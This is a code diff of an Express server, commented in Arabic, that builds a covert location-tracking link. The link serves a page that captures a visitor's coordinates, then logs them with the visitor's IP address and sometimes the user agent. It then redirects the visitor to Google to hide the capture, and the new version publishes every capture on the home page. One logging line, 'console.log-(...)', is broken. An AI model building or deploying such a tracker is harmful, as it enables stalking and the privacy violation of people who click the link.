@@ -1,83 +1,59 @@
 const express = require('express');
-const cors = require('cors');
-const fs = require('fs');
-const path = require('path');
-
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
-app.use(cors());
-app.use(express.json());
+// قاعدة بيانات بسيطة
+let locations = [];
+
 app.use(express.static('public'));
+app.use(express.json());
 
-// مسار ملف قاعدة البيانات البسيطة
-const dbFile = path.join(__dirname, 'locations.json');
-
-// دالة لقراءة البيانات من الملف
-const readData = () => {
-    if (!fs.existsSync(dbFile)) {
-        fs.writeFileSync(dbFile, JSON.stringify([]));
-    }
-    const data = fs.readFileSync(dbFile, 'utf8');
-    return JSON.parse(data);
-};
-
-// دالة لكتابة البيانات إلى الملف
-const writeData = (data) => {
-    fs.writeFileSync(dbFile, JSON.stringify(data, null, 2));
-};
-
-// صفحة الاستقبال: عندما يفتح المستخدم الرابط
-app.get('/track', (req, res) => {
-    const id = req.query.id;
-    if (!id) {
-        return res.send('معرف غير صالح');
-    }
-    // نرسل له صفحة HTML التي ستجمع الموقع
-    res.sendFile(path.join(__dirname, 'public', 'track.html'));
+// الصفحة الرئيسية
+app.get('/', (req, res) => {
+    res.send(`
+        <h1>موقع تتبع الموقع الجغرافي</h1>
+        <p>أنشئ رابط: <strong>/track/YOUR_ID</strong></p>
+        <p>مثال: https://your-site.com/track/123456</p>
+        <h3>النتائج المسجلة:</h3>
+        <pre>${JSON.stringify(locations, null, 2)}</pre>
+    `);
 });
 
-// نقطة نهاية API لتلقي الموقع من المتصفح
-app.post('/api/location', (req, res) => {
-    const { id, latitude, longitude, accuracy } = req.body;
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const userAgent = req.headers['user-agent'];
-    const timestamp = new Date().toISOString();
-
-    const locationData = {
-        id,
-        latitude,
-        longitude,
-        accuracy,
-        ip,
-        userAgent,
-        timestamp
-    };
-
-    // قراءة البيانات الحالية وإضافة الجديدة
-    const locations = readData();
-    locations.push(locationData);
-    writeData(locations);
-
-    console.log('تم استلام الموقع:', locationData);
-
-    // يمكنك توجيه المستخدم إلى أي صفحة تريد بعد الحصول على الموقع
-    // هنا سنوجهه إلى Google كمثال
-    res.json({ redirectUrl: 'https://www.google.com' });
+// رابط التتبع
+app.get('/track/:id', (req, res) => {
+    const userId = req.params.id;
+    res.sendFile(__dirname + '/public/tracker.html');
 });
 
-// صفحة لعرض البيانات المسجلة (للإدارة)
-app.get('/admin', (req, res) => {
-    const locations = readData();
+// API لتلقي بيانات الموقع
+app.post('/api/save-location', (req, res) => {
+    const data = req.body;
+    data.timestamp = new Date().toISOString();
+    data.ip = req.headers['x-forwarded-for'] || req.ip;
+    
+    locations.push(data);
+    
+    console.log('📍 تم تسجيل موقع جديد:');
+    console.log('- ID:', data.id);
+    console.log-(' الموقع:', data.latitude, data.longitude);
+    console.log('- العنوان:', data.address);
+    console.log('- الوقت:', data.timestamp);
+    console.log('- IP:', data.ip);
+    console.log('-----------------------------------');
+    
+    // بعد الحفظ، وجه المستخدم لموقع آخر (اختياري)
+    res.json({ 
+        success: true, 
+        redirect: 'https://google.com' // غير هذا لموقعك
+    });
+});
+
+// صفحة لعرض جميع النتائج
+app.get('/results', (req, res) => {
     res.json(locations);
 });
 
-// صفحة الرئيسية
-app.get('/', (req, res) => {
-    res.send('مرحباً، استخدم رابط التتبع مثل /track?id=123456');
-});
-
 app.listen(PORT, () => {
-    console.log(`الخادم يعمل على المنفذ ${PORT}`);
+    console.log(`✅ الخادم يعمل: http://localhost:${PORT}`);
+    console.log(`📌 رابط التجربة: http://localhost:${PORT}/track/123456`);
 });
